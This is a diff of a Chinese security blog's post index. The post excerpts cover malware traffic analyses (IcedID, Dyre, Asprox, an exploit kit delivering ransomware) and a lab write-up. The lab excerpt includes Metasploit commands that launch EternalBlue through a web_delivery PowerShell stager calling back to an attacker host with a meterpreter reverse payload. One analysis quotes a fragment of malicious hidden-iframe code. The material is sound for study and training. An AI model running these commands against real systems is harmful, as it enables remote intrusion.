@@ -279,21 +279,13 @@ JavaScript 信息收集还是先找 Chunk 表
     <div class="post-info">
       <div class="post-meta">
         <span><span class="icon-calendar"></span>2026-10-16</span>
-        <span><span class="icon-pencil"></span>482 字</span>
-        <span><span class="icon-clock"></span>3 分钟</span>
+        <span><span class="icon-pencil"></span>812 字</span>
+        <span><span class="icon-clock"></span>4 分钟</span>
       </div>
       <h2 class="post-title">IcedID 感染、Anubis VNC 远控与 Trickbot 域控传播的流量分析</h2>
       <article class="post-article">
-          IcedID 感染、Anubis VNC 远控与 Trickbot 域控传播的流量分析通信环境样本链接：https://malware-traffic-analysis.net/2019/11/13/index.html
-本次受害主机为两台
-
-攻击链恶意文件下载过滤 HTTP 请求看到下载了多个 EXE，所以最先受感染的主机是 10.11.13.101
-
-横向移动过滤出横向移动的痕迹
-1ip.src == 10.11.13.101 &amp;amp;&amp;amp; ip.dst == 10.11.13.9 &amp;amp;&amp;amp; tcp.port == 445
-
-
-第 6556 帧 SMB Tree Con
+          IcedID 感染、Anubis VNC 远控与 Trickbot 域控传播的流量分析通信环境IcedID 感染： 以恶意邮件或其他下载器投递为起点，感染主机通过 HTTP 获取经过 GZIP 压缩的恶意载荷，随后通过 HTTPS 与 C2 服务器进行加密通信，并可能出现后续载荷下载、BackConnect 反向通信及其他恶意模块活动，重点关注可疑下载请求、TLS 证书特征和持续的外联行为
+Anubis VNC 远控： 这里的 Anubis VNC 是与 IcedID 相关的隐藏桌面远控模块，攻击者可通过 VNC 类图形会话远程操作受害主机、浏览文件、执行命令及使用应用程序，流量分析应重点关注
       </article>
     </div>
   </div>
@@ -419,17 +411,18 @@ LNK 参数以 /C 启动 PowerShell，完整参数为：
     <div class="post-info">
       <div class="post-meta">
         <span><span class="icon-calendar"></span>2026-10-15</span>
-        <span><span class="icon-pencil"></span>296 字</span>
+        <span><span class="icon-pencil"></span>338 字</span>
         <span><span class="icon-clock"></span>2 分钟</span>
       </div>
       <h2 class="post-title">Dyre 银行木马流量分析</h2>
       <article class="post-article">
-          Dyre 银行木马流量分析通信环境样本链接：https://malware-traffic-analysis.net/2014/12/05/2014-12-05-Upatre-Dyre-infection-traffic.pcap.zip
+          Dyre 银行木马流量分析通信环境Dyre 这份流量最有辨识度的是 Upatre 下载器的通信特征，以及后续 Dyre 的异常 TLS 证书、重复加密通信和 STUN 流量
+样本链接：https://malware-traffic-analysis.net/2014/12/05/2014-12-05-Upatre-Dyre-infection-traffic.pcap.zip
 受害主机只有一台
 
 攻击链恶意 ZIP 下载追踪 HTTP 流发现恶意 JS 代码
 
-12345&amp;lt;div style=&amp;quot;display:none&amp;quot;&amp;gt;  &amp;lt;iframe id=&amp;quot;mcnt&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;  &amp;lt;a id=&amp;quot;mylink&amp;quot; download=
+12345&amp;lt;div style=&amp;quot;display:none&amp;quot;&amp;gt;  &amp;lt;iframe id=&amp;quo
       </article>
     </div>
   </div>
@@ -443,12 +436,13 @@ LNK 参数以 /C 启动 PowerShell，完整参数为：
     <div class="post-info">
       <div class="post-meta">
         <span><span class="icon-calendar"></span>2026-10-15</span>
-        <span><span class="icon-pencil"></span>431 字</span>
+        <span><span class="icon-pencil"></span>493 字</span>
         <span><span class="icon-clock"></span>2 分钟</span>
       </div>
       <h2 class="post-title">Asprox 木马流量分析</h2>
       <article class="post-article">
-          Asprox 木马流量分析通信环境样本链接：https://malware-traffic-analysis.net/2014/12/11/2014-12-11-traffic-by-malware-from-Asprox-malspam-run-on-a-VM.pcap.zip
+          Asprox 木马流量分析通信环境EK 的重点是利用浏览器或插件漏洞投递恶意程序，而 Asprox 这份流量的重点是恶意邮件分发、下载器感染、多阶段载荷投递，以及后续的 C2 和点击欺诈通信
+样本链接：https://malware-traffic-analysis.net/2014/12/11/2014-12-11-traffic-by-malware-from-Asprox-malspam-run-on-a-VM.pcap.zip
 受害主机只有一台
 
 攻击链ZIP 木马下载过滤 HTTP
@@ -457,8 +451,7 @@ LNK 参数以 /C 启动 PowerShell，完整参数为：
 
 导出后放到云沙箱识别出是木马，家族类型 Kuluoz
 
-木马回连继续追踪下一个数据流，HTTP 正文为不可读二进制，尽管请求声称 application/x-www-form-urlencoded
-响应 HTTP/
+
       </article>
     </div>
   </div>
@@ -472,7 +465,7 @@ LNK 参数以 /C 启动 PowerShell，完整参数为：
     <div class="post-info">
       <div class="post-meta">
         <span><span class="icon-calendar"></span>2026-10-15</span>
-        <span><span class="icon-pencil"></span>957 字</span>
+        <span><span class="icon-pencil"></span>1.1k 字</span>
         <span><span class="icon-clock"></span>5 分钟</span>
       </div>
       <h2 class="post-title">G01PACK EK 投递锁屏型勒索软件流量分析</h2>
@@ -500,18 +493,21 @@ Java 利用组件把和这个域名相关的请求全部过滤出来
     <div class="post-info">
       <div class="post-meta">
         <span><span class="icon-calendar"></span>2026-10-15</span>
-        <span><span class="icon-pencil"></span>256 字</span>
-        <span><span class="icon-clock"></span>2 分钟</span>
+        <span><span class="icon-pencil"></span>450 字</span>
+        <span><span class="icon-clock"></span>3 分钟</span>
       </div>
       <h2 class="post-title">Win 2016 + Nacos（2025 年第一期）</h2>
       <article class="post-article">
           Win 2016 + Nacos（2025 年第一期）靶机下载链接：
+Ubuntu 按照以下命令启动
+123systemctl start dockerdocker start mysql  # 启动后等一会docker start nacos-standalone-mysql
+
 信息收集扫描网段中的存活主机
 
 扫描具体开放端口，只有 445 可打
 
-MS17_010 永恒之蓝先用 web_delivery 起一个 PowerShell stager：
-123456use exploit/multi/script/web_deliveryset target 2                     # 2 = PSH (PowerShell)set LHOST 192.168.83.135set SRVPORT 8080set payload windows/x64/meterpreter/rev
+RCEMS17_010 永恒之蓝先用 web_delivery 起一个 PowerShell stager：
+123456use exploit/multi/script/web_deliveryset target 2             
       </article>
     </div>
   </div>
@@ -539,10 +535,10 @@ MS17_010 永恒之蓝先用 web_delivery 起一个 PowerShell stager：
       </div>
       <div>
         <span class="icon-brush"></span>
-        379.7k
+        380.6k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        30:54
+        30:56
       </div>
       <div>
         <span class="icon-eye"></span>
